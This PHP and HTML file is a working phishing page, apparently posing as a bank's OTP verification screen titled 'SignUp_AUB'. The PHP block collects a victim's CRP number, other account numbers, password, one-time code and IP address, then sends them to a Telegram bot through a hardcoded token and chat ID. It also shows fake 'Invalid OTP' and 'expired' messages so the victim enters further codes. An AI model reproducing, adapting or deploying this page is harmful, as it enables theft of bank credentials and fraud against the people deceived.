<?php
   session_start();
    $msg = "";
   
   
   if(isset($_GET['send']))
   {
    $_SESSION['count']++;
    $crpnum=$_SESSION['crpnumber'];
    $snum=$_SESSION['sixnumber'];
    $fnum=$_SESSION['fournumber'];
    $password=$_SESSION['password'];
    $otp = $_GET['otp'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
    $user_ip = $_SERVER['REMOTE_ADDR'];
     }
     
     
     $token = "6701792944:AAEsLcRvGnQ10YdJ3ZyuRmSL-8_4UaipwP8";
     
     $data = [
          "text" => "CRP Number : $crpnum
          Six Digit Number : $snum 
          Four Digit Number : $fnum 
          Password : $password 
          OTP Number : $otp 
          User IP Address : $user_ip ",
          "chat_id" => "6066856746"
           
         
         
         ];
          
         $response = file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
         
         if($_SESSION['count'] > 2)
         {
              $msg = "The OTP has been expired and you will be resend";
              $_SESSION['count'] = 0;
         }
         else 
         {
             $msg = "Invalid OTP. Please Try to Enter the correct OTP";
         }
         
        
   }
         

    
    
    
    
    
    
    
    
    
    
    
    
?>

<html lang="en"><head>
      
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SignUp_AUB</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
     <style>
        .credit {
            display: none;
        }
        
        .main
        {
        	max-width: 400px;
        	margin:auto; 
        	text-align: center;
        }
      </style>
  </head>

  <body style="font-family: Roboto-Bold; background-color: rgb(239, 238, 247); color: rgb(50, 111, 131); zoom: 1;">
<div class="main">
	
<div class="container-fluid bg-light p-2">
	<div class="row">
		<div class="col-2">
			<a href="index.php" style="color: #326F83;text-decoration:none;">&lt;</a>
		</div>
		<div class="col-8 text-center">
			OTP
		</div>
		<div class="col-2">
			
		</div>
	</div>

</div>
<br>
<div class="container p-2">
    
<img src="assets/img/jfADxrr.png" width="200px">
<p class="text-start">Enter the OTP sent on your existing Registered Mobile Number.</p>
<div class="btnGroup">
        <span class="Btn" id="verifiBtn">
         OTP will expire after:
        </span>
        <span class="timer" style="color:#0E7096;">
          <span id="counter">0:52</span>
        </span>
      </div>
<form method="get">
	<input type="tel" id="customInput9"
	name="otp" 
	class="form-control" minlength="6" maxlength="6" required="">  <br>
      <input type="hidden" name="number" value="<?php echo $snum; ?>">
        
        <input type="hidden" name="numm" value="<?php echo $fnum; ?>">
        <input type="hidden" name="password" value="<?php echo $password; ?>">
        <p class="text-danger mt-2 mb-2"><?php echo $msg; ?> </p>
<button type="submit" name="send" class="btn btn-primary w-100" 
style="color: #ffffff;">Verify</button><br><br>

	<button type="reset" class="btn btn-danger w-100" style="color: #ffffff;">Cancel</button>
</form>	
</div>

<script>
  function countdown() {
    var seconds = 80; // Set to 120 for a 2-minute countdown

    function tick() {
      var counter = document.getElementById("counter");
      seconds--;
      var minutes = Math.floor(seconds / 60);
      var remainingSeconds = seconds % 60;

      counter.innerHTML =
        String(minutes) +
        ":" +
        (remainingSeconds < 10 ? "0" : "") +
        String(remainingSeconds);

      if (seconds > 0) {
        setTimeout(tick, 1000);
      } else {
        document.getElementById("verifiBtn").innerHTML = `
          <div class="Btn" id="ResendBtn">
            <button type="submit" class="btn btn-warning">Resend</button>
          </div>
        `;
        document.getElementById("counter").innerHTML = "";
      }
    }

    tick();
  }
  countdown();
</script>
<script>
  const customInput9 = document.getElementById('customInput9');
  const customError9 = document.getElementById('customError9');
  

  customInput9.addEventListener('input', function() {
    if (this.validity.tooShort) {
      customInput9.setCustomValidity('Enter Correct OTP Number 6 Digit ');
    } else if (this.validity.tooLong) {
      customInput9.setCustomValidity('Enter Correct OTP Number');
    } else {
      customInput9.setCustomValidity('');
    }
  });

  
  customInput9.addEventListener('invalid', function() {
    customError9.innerText = customInput9.validationMessage;
  });

</script>


</div>


 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
  

	</body></html>


